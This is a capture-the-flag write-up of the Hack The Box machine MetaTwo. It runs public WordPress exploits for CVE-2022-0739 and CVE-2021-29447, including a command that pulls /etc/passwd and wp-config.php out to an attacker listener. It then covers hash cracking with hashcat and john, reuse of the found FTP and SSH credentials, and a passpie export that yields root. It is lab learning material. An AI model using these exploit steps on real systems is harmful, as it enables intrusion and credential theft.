---
title: HTB-MetaTwo
date: 2024-11-06 06:45:18
tags:
- HTB
---
# Nmap
`nmap -Pn -sC -sV -O -T3 -p- 10.10.11.186 -oN nmap_scan`
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 c4:b4:46:17:d2:10:2d:8f:ec:1d:c9:27:fe:cd:79:ee (RSA)
|   256 2a:ea:2f:cb:23:e8:c5:29:40:9c:ab:86:6d:cd:44:11 (ECDSA)
|_  256 fd:78:c0:b0:e2:20:16:fa:05:0d:eb:d8:3f:12:a4:ab (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://metapress.htb/
```

# Website
Domain = `metapress.htb`
```
echo "10.10.11.186 metapress.htb" | sudo tee -a /etc/hosts
```
Its wordpress so we can do a basic scan with the tool `wpscan`
```
wpscan --url http://metapress.htb/
```
The scan gave us some good info like `WordPress version 5.6.2` and  `PHP/8.0.24`
Potential CVE if we manage to get a user CVE-2021-29447
https://github.com/0xRar/CVE-2021-29447-PoC

# Event Form
The even form has no SSTI. Also i tried looking into other tickets to maybe get some email adresses.
The request is this and the `appointment_id` the base64 encoded
http://metapress.htb/thank-you/?appointment_id=MQ==
`echo "MQ==" | base64 -d` the output was 1 I will try to brute force it in burp
I run the first 100 ids but nothing expect mine came back with info

Looking into the source code we find that it runs bookingpress a CVE that might works is
[CVE-2022-0739](https://github.com/destr4ct/CVE-2022-0739)

In the poc it says we need the `nonce` we can find that if we look on the event page source code by searching `_wpnonce`.
![Wpnonce](/images/MetaTwo/MT(nonce).png)
After running the poc we get:
![POC](/images/MetaTwo/MT(poc).png)
```
|admin|admin@metapress.htb|$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.|
|manager|manager@metapress.htb|$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70|
```

# Cracking the hash
I run `hash-identifier` and i found that the hash is MD5(Wordpress)
![Hash-id](/images/MetaTwo/MT(Hash-id).png)
With a quick search we find that the hashcat mode is 400 (from this website https://hashcat.net/wiki/doku.php?id=example_hashes)
```
hashcat hashes.txt -m 400 /usr/share/wordlists/rockyou.txt
```
Manager hash cracked
```
$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70:partylikearockstar
```
`Manager:partylikearockstar
`

# Manager Dashboard
![ManagerDash](/images/MetaTwo/MT(Manager_Dash).png)
As we can see we don't have alot of privilages to change the website but we can upload media. From the initial recon I had found the CVE-2021-29447
https://github.com/0xRar/CVE-2021-29447-PoC

We can run the poc code
```
python3 PoC.py -l 10.10.14.20 -p 8888 -f /etc/passwd
```
and we get a base64 encoded message
![Decode](/images/MetaTwo/MT(CVE-MEDIA).png)
we can decode that by putting it on the `decode.php` and running
```
php decode.php
```
![Decoder](/images/MetaTwo/MT(decoding).png)
Now we will try to get the /wpconfig.php
```
python3 PoC.py -l 10.10.14.20 -p 8888 -f ../wp-config.php
```
![wp-cong](/images/MetaTwo/MT(Wp-config).png)
After decoding it we find:
```
define( 'FS_METHOD', 'ftpext' );
define( 'FTP_USER', 'metapress.htb' );
define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
define( 'FTP_HOST', 'ftp.metapress.htb' );
define( 'FTP_BASE', 'blog/' );
define( 'FTP_SSL', false );
```
the ftp username and password `metapress.htb:9NYS_ii@FyL_p5M2NvJ`
(and some db creds)
```
/** MySQL database username */
define( 'DB_USER', 'blog' );

/** MySQL database password */
define( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );
```

# Ftp 

```
ftp 10.10.11.186
```
Using the creds we got `metapress.htb:9NYS_ii@FyL_p5M2NvJ` we can login to ftp. Inside the ftp we find another app that runs named `mailer`.  Inside there there is a file `send_email.php` we can download that file to our system with:
```
get send_email.php
```
In there we find user and pass and another port `587` that we didnt see on nmap
```
$mail->Host = "mail.metapress.htb";
$mail->SMTPAuth = true;                          
$mail->Username = "jnelson@metapress.htb";                 
$mail->Password = "Cb4_JmWM8zUZWMu@Ys";                           
$mail->SMTPSecure = "tls";                           
$mail->Port = 587; 
```

We can try use those creds to login via ssh
```
ssh jnelson@metapress.htb
```
Creds worked and we have a shell as `jnelson`

# Privilege Escalation

Doing `ls -la` we can see a folder that its not common on linux machines a `passpie` folder
that holds some keys
The passpie export command exports the credentials saved in passpie in plain text. `passpie export password.db` but we dont have the passphrase.

We will download our keys to our machine with:
```
scp jnelson@metapress.htb:/home/jnelson/.passpie/.keys ./keys
```
First let us generate the password hash from the private GPG key using gpg2john and save it into a file named keys.hash
```
gpg2john keys > keys.hash
```
We can now try brute-forcing the password hash and see if we can be cracked. We can use "John The Ripper" for this purpose
```
john -wordlist=/usr/share/wordlists/rockyou.txt keys.hash --format=gpg
```
![John](/images/MetaTwo/MT(johncrack).png)
and we get `blink182` as passpi passphrase.

Now we can do
```
passpie export ~/password.db
```
```
cat ~/password.db
```
```
credentials:
- comment: ''
  fullname: root@ssh
  login: root
  modified: 2022-06-26 08:58:15.621572
  name: ssh
  password: !!python/unicode 'p7qfAZt4_A1xo_0x'
- comment: ''
  fullname: jnelson@ssh
  login: jnelson
  modified: 2022-06-26 08:58:15.514422
  name: ssh
  password: !!python/unicode 'Cb4_JmWM8zUZWMu@Ys'
handler: passpie
version: 1.0
```
We got creds for root `root:p7qfAZt4_A1xo_0x` now we can just ssh to root
```
ssh root@metapress.htb
```
